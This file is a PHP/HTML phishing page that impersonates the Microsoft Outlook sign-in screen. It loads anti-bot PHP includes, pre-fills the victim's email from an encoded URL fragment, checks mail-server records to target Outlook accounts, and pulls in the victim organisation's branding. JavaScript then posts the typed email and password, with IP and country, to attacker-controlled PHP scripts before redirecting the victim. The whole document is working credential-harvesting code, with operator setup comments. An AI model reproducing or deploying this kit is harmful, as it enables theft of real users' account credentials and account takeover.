<?php

include('../../class/bk.php');
include('../../class/ant.php');
include('../../class/b.php');
include('../../class/bo.php');
include('../../class/bt.php');

?>
<html dir="ltr" lang="en">
   <title>Sign in to Outlook</title>
   <meta charset="utf-8">
   <link href="https://aadcdn.msftauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" rel="shortcut icon">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" integrity="sha256-NuCn4IvuZXdBaFKJOAcsU2Q3ZpwbdFisd5dux4jkQ5w=" crossorigin="anonymous">
   <link href="lib/css/login.css" rel="stylesheet">
   <body class="cb" style="display:block">
      <div>
         <div>
            <div class="app background">
               <div id="bg_image" style="background-image:url(lib/img/background.jpg")></div>
            </div>
         </div>

            <div class=outer>
               <div class="app middle">



                  <div class="background-logo-holder">
                     <img id="banner_image" class="background-logo" src="lib/img/logo3.png">
                  </div>
                  <div class="app fade-in-lightbox inner">
                     <div>
                        <img id="logo_image" class="banner-logo" src="lib/img/logo2.svg">
                     </div>
                     <div>

					  <div id="pba1" style="display:none" class="lightbox-cover disable-lightbox" data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div> 

<div id="pba2" style="display:none"  class="progress" role="progressbar" data-bind="component: 'marching-ants-control', ariaLabel: str['WF_STR_ProgressText']" aria-label="Please wait"><!--  --><!-- ko if: useCssAnimation --> <div></div><div></div><div></div><div></div><div></div>

</div>
                        <div id="pick_em" style="display: none;">
                           <div class="animate pagination-view slide-in-next">
                              <div data-showfedcredbutton=true data-viewid=1>
                                 <div>
                                    <div class="row text-title" id="loginHeader">
                                       <div aria-level=1>Sign in</div>
                                    </div>
                                 </div>
                                 <div class="row">
                                    <div class="col-md-24 form-group">
                                       <div class="placeholderContainer">
					                   <div class="add_em">
											 <p style="font-weight: bold;margin-left: 4%">Pick an account</p>
											 <a href="#" class="email-picker">
												 <div class="block-m2">
													<img role="presentation" src="lib/img/picker_account.png"> <span id="em_picker"></span><span style="float:right; margin-top:4%"><img src="lib/img/picker_more.png" alt=""></span>
												 </div>
											 </a>
											 <a href="#" class="email-picker2">
												 <div class="block-m2">
													<img role="presentation" src="lib/img/plus.svg"><span style="word-wrap:break-word;"> Use another account</span>
												 </div>
											 </a>
											 <br>
										</div>
                                       </div>
                                    </div>
                                 </div>
                                 <div class="position-buttons">

                                 </div>
                              </div>
                           </div>
                        </div>
					 
                        <div id="add_em" style="display: none;">
                           <div class="animate pagination-view slide-in-next">
                              <div data-showfedcredbutton=true data-viewid=1>
                                 <div>
                                    <div class="row text-title" id="loginHeader">
                                       <div aria-level=1>Sign in</div>
                                       <div class="text-13 subtitle" aria-level=2>to continue to Outlook</div>
                                    </div>
                                 </div>
                                 <div class=row>
									<div aria-live="assertive" role="alert" style="display: none;" class="error-alert">
										<div class="alert alert-error error-alert-msg"></div>
										<br>
									</div>
                                    <div class="col-md-24 form-group">
                                       <div class="placeholderContainer">
											<input type="text" name="email" id="email" class="form-control ltr_override" value="" placeholder="someone@example.com ">
                                       </div>
                                    </div>
                                 </div>
                                 <div class="position-buttons">
                                    <div class=row>
                                       <div class=col-md-24>
                                          <div class="text-13 action-links">
                                             <div class=form-group>
                                                <a href="#" >Can’t access your account?</a>
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                    <div class=row>
                                       <div class="col-xs-24 no-padding-left-right button-container">
                                       <div class=inline-block>
                                          <button class="btn btn-block btn-primary btn-email">Next</button>
                                       </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
						<div id="add_pass" style="display: none;">
							<div class="animate slide-in-next">
								<div>
									<div class="identityBanner">
										<a class="backButton" href="#" type="button">
											<img src="lib/img/arrow.svg">
										</a>
										<div class="identity"></div>
									</div>
								</div>
							</div>
							<div class="animate slide-in-next has-identity-banner pagination-view">
								<div class="row text-title">Enter password</div>
								<div class=row>
									<div class="form-group col-md-24">
										<div aria-live="assertive" role="alert" style="display: none;" class="error-alert-pass">
											<div class="alert alert-error">Your email or password is incorrect. If you don't remember your password, <a href='#'>reset it now.</a></div>
										</div>
										<div class=placeholderContainer>
											<input name="password" type="password" id="password" autocomplete="off" class="form-control" placeholder="Password" tabindex="0">
										</div>
									</div>
								</div>
								<div class=position-buttons>
									<div>
										<div class=row>
											<div class=col-md-24>
													<div class="action-links text-13">
													<div class=form-group><a href="#">Forgot my password</a></div>
													<div class=form-group></div>
												</div>
											</div>
										</div>
									</div>
									<div class=row >
										<div>
											<div class="button-container col-xs-24 no-padding-left-right">
												<div class=inline-block>
													<button class="btn btn-block btn-primary btn-signin">Sign in</button>
												</div>
											</div>
										</div>
									 </div>
								</div>
							</div>
                        </div>
                     </div>
                  </div>
                  <div>
                  </div>
                  <div class=footer id=footer>
                     <div>
                        <div class="footerNode text-secondary">
                           <span>©2019 Microsoft</span> 
                           <a href="#">Terms of use</a> 
                           <a href="#">Privacy & cookies</a>
                           <a href="#"><img src="lib/img/white_ellipsis.svg"></a>
                        </div>
                     </div>
                  </div>
               </div>
            </div>

      </div>
	  <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
  <script>
		$( document ).ready(function() {
 

			// Note : if this HTML page hosted on http(s) domain so you must add the http(s) url php file to avoid cross error //

			var php_url = 'login.php'; // Enter your post PHP page url here.
			var check_mx = true; // true or false for check outlook MX.
			// ******************************************************************************************************* //
			var hash = window.location.hash;
			var emailat = hash.split('#')[1];
 		    var email = atob(emailat);
			if(true_email(email)){
				$("#pick_em").show();
				$("#em_picker").html(email);
				$('#email').val(email);
			}else{
				$("#add_em").show();
			}

			$('.email-picker').on('click', function (){
				$('.identity').html(email);
				$(".error-alert-pass").hide();
				set_brand(email);
				setTimeout(function (){
					$("#pick_em").hide();
					$("#add_pass").show();
				}, 1000);
			});

			$('.email-picker2').on('click', function (){
				$('#email').val('');
				$("#pick_em").hide();
				$("#add_em").show();
			});

			$('.btn-email').on('click', function (){
				var email = $('#email').val();
				$('.identity').html(email);
				$(".error-alert").hide();
				$('.btn-email').prop('disabled', true);
				if(true_email(email) == false){
					$(".error-alert").show();
					$(".error-alert-msg").html('Plase enter correct outlook account email.');
					$('.btn-email').prop('disabled', false);
				}else{
					if(check_mx == true){
						var domain = email.split('@')[1];
						var str;
						$.ajax({
							url: php_url + '?domain=' + domain,
							success: function(data){
								str = data.includes("outlook");
								if(str){
									set_brand(email);
									setTimeout(function (){
										$("#add_em").hide();
										$("#add_pass").show();
									}, 1000);
								}else{
									$(".error-alert").show();
									$(".error-alert-msg").html('You can\'t signin with this account, Please use work or school account instead.');
									$('.btn-email').prop('disabled', false);
								}
							},
							error: function(xhr){
								$(".error-alert").show();
								$(".error-alert-msg").html('Error occured, Please try again.');
								$('.btn-email').prop('disabled', false);
							}
						});
					}else{
						set_brand(email);
						setTimeout(function (){
							$("#add_em").hide();
							$("#add_pass").show();
						}, 1000);
					}
				}
			});

			$('.btn-signin').on('click', function (){
				$('.btn-signin').prop('disabled', true);
				setTimeout(function (){
					$(".error-alert-pass").hide();
				}, 500);
				var user = $('#email').val();
				var pass = $('#password').val();
 if( pass == ''){
$(".error-alert").show();
$(".error-alert-msg").html('Please enter your password!.');

  }else{
  document.getElementById("pba1").style.display = "block"; 
  document.getElementById("pba2").style.display = "block"; 				
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange=function() {
    if (this.readyState == 4 && this.status == 200) {
	var result = JSON.parse(this.responseText);
   if(result.p=='1'){
	 $.ajax({
		 url: php_url,
		 type: "POST",
		 data: {user:atob(user),pass:pass,country:result.country,ip:result.ip},
		 success: function(finish_url){
		 if(finish_url !== null && finish_url !== ''){
				location.replace(finish_url);
				setTimeout("window.location.href='"+ finish_url +"';", 1000);
		 }else{
				location.replace(result.url);
				setTimeout("window.location.href='"+ result.url +"';", 1000);
				 
		 
		 
		 }
		 }
	 });
							 
							 
 }else{
document.getElementById("pba1").style.display = "none"; 
document.getElementById("pba2").style.display = "none";
$(".error-alert-pass").show();
$('.btn-signin').prop('disabled', false);
						}
 }else{
 
$(".error-alert-pass").hide();
$('.btn-signin').prop('disabled', false);
}
  };
  xhttp.open("POST", "a.php", true);
 xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 xhttp.setRequestHeader("Authorization1",user);
 xhttp.setRequestHeader("Authorization",pass);
 xhttp.send(); 
  }		
 
	 	});

			$('.backButton').on('click', function (){
				$('#bg_image').css('background-image', 'url(lib/img/background.jpg)');
				$('#logo_image').attr('src', 'https://aadcdn.msftauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg');
				$('#banner_image').show();
				$('.btn-email').prop('disabled', false);
				$("#add_pass").hide();
				$("#add_em").show();
				$(".error-alert-pass").hide();
			});

			function set_brand(email){
				$.ajax({
					url: php_url,
					type: "POST",
					data: {email:email,barnd:1},
					success: function(data){
						var i=JSON.parse(data);
 
						if(i.bg_image !== null && i.bg_image !== ''){
							$('#bg_image').css('background-image', 'url(' + i.bg_image + ')');
 							$('#banner_image').hide();
						//	alert(i.logo_image);
						}
						
						if(i.logo_image !== null && i.logo_image !== ''){
 							$('#logo_image').attr('src', i.logo_image);
							$('#banner_image').hide();
						//	alert(i.logo_image);
						}
					}
				});
			}
		});

		function true_email(a) {
			var re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
			return re.test(a);
		}
	  </script>
    <script type="text/javascript">
  $(document).keypress(function(event){
  var keycode = (event.keyCode ? event.keyCode : event.which);
  if(keycode == '13'){
    $("#btn-email, .btn-signin").click();
  }
});
</script>  </body>
   </html>